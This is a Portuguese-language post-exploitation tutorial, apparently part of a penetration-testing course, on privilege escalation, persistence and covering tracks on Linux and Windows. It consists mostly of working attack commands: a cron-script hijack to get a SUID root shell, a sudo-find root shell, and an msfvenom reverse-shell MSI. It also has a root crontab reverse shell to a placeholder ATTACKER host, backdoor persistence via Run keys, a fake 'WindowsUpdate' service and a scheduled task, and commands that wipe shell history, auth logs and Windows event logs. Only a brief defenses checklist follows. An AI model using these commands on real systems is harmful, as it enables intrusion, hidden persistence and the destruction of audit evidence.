# Pós-Exploração — Escalação de Privilégio

## Introdução

Após ganhar acesso inicial, objetivo é elevar privilégios para root/admin.

---

## Escalação em Linux

### 1. Verificar Acesso Atual

```bash
id
uid=1001(user) gid=1001(user) groups=1001(user)

whoami
user

sudo -l
(No sudo access)
```

### 2. Procurar Vulnerabilidades

#### Kernel Vulnerabilities

```bash
uname -a
Linux target 4.15.0-29-generic x86_64 GNU/Linux

# Procurar CVE para essa versão
searchsploit "Linux 4.15.0"
```

#### SUID Binaries

```bash
find / -perm -u=s -type f 2>/dev/null

# Resultado
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/su
/usr/sbin/fusermount
/usr/sbin/mount.cifs
/usr/bin/at
```

**Suspeitos**: at, fusermount, scripts customizados

#### Sudo Misconfig

```bash
sudo -l

Resultado:
(ALL) NOPASSWD: /bin/cat

# Pode ler qualquer arquivo!
sudo cat /root/.ssh/id_rsa
```

#### Cronjobs

```bash
cat /etc/crontab

*/5 * * * * root /tmp/backup.sh

# Se /tmp/backup.sh for gravável
echo "cp /bin/bash /tmp/bash && chmod u+s /tmp/bash" > /tmp/backup.sh

# Aguardar 5 minutos
/tmp/bash -p  # Shell com privilégio root
```

#### Permissões Fracas

```bash
ls -la /etc/shadow

-rw-r--r-- 1 root root  /etc/shadow  # LEITURA POSSÍVEL!

cat /etc/shadow | head -5
root:$6$...:17500:0:99999:7:::
```

#### Passwords em Arquivos

```bash
grep -r "password" /home
grep -r "pass" /tmp
find / -name "*.conf" -exec grep "password" {} \;
```

#### LD_PRELOAD

```bash
# Se LD_PRELOAD não estiver restringido
export LD_PRELOAD=/tmp/malicious.so

# Malicious.so com uid=0
```

### 3. Explorar Vulnerabilidade

#### Exemplo: CVE no Kernel

```bash
# Compilar exploit
gcc exploit.c -o exploit

# Executar
./exploit

# Resultado
root@target:~# id
uid=0(root) gid=0(root) ...
```

#### Exemplo: Sudo NOPASSWD

```bash
sudo find . -exec /bin/bash \;

root@target:~#
```

---

## Escalação em Windows

### 1. Verificar Acesso

```bash
whoami
DOMAIN\user

net user %username%
```

### 2. Procurar Vulnerabilidades

#### UAC Bypass

```bash
# Procurar aplicação com UAC desabilitado
Get-ChildItem C:\Program Files -Recurse -Filter *.exe | 
  Select-Object Name,VersionInfo
```

#### Stored Credentials

```powershell
# Credenciais em PowerShell history
Get-History

# Arquivo de configuração
type C:\Users\user\Documents\creds.txt

# Registro
reg query HKLM\Software /s /v password
```

#### Groups e Permissions

```cmd
net user
net group "Domain Admins"
whoami /groups
```

#### AlwaysInstallElevated

```cmd
# Verificar registro
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# Se = 1: Instalar MSI como admin
msfvenom -p windows/shell_reverse_tcp -f msi > reverse.msi
msiexec /i reverse.msi /quiet
```

#### Service Misconfig

```powershell
Get-Service | Where-Object {$_.StartType -eq 'Disabled'} | Select-Object Name

# Procurar service com arquivo gravável
Get-ChildItem 'C:\Program Files' -Recurse | Get-ACL | Where-Object {$_.Access -match 'Everyone.*Modify'}
```

### 3. Explorar

#### Metasploit

```bash
use exploit/windows/local/bypassuac_eventvwr
set SESSION 1
run
```

---

## Persistência

### Linux

#### Cron Job

```bash
# Adicionar ao crontab root
echo "* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1" | sudo crontab -

# Resultado: Reverse shell a cada minuto
```

#### Rootkit

```bash
# Instalar rootkit (malware)
# Persiste mesmo após reboot
```

### Windows

#### Registry Run

```powershell
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Temp\backdoor.exe"
```

#### Service

```powershell
New-Service -Name "WindowsUpdate" -BinaryPathName "C:\Temp\backdoor.exe" -StartupType Automatic
Start-Service WindowsUpdate
```

#### Scheduled Task

```powershell
$trigger = New-ScheduledTaskTrigger -AtStartup
$action = New-ScheduledTaskAction -Execute 'C:\Temp\backdoor.exe'
Register-ScheduledTask -TaskName "SystemCheck" -Trigger $trigger -Action $action -RunLevel Highest
```

---

## Cobertura de Trilhas

### Limpar Logs

```bash
# Linux
history -c
history -w
cat /dev/null > ~/.bash_history

# Logs do sistema
sudo cat /dev/null > /var/log/auth.log
sudo cat /dev/null > /var/log/syslog
```

### Windows

```powershell
# Clear event logs
Clear-EventLog -LogName Security
Clear-EventLog -LogName Application
Clear-EventLog -LogName System
```

---

## Defensas

```
✅ Manter sistema atualizado
✅ Minimizar sudo/admin access
✅ Monitorar logs
✅ Usar antivírus
✅ Aplicar hardening
✅ Auditar permissões
✅ MFA/2FA
✅ AppLocker (Windows)
```

---

Próximo: `persistence-techniques.md`
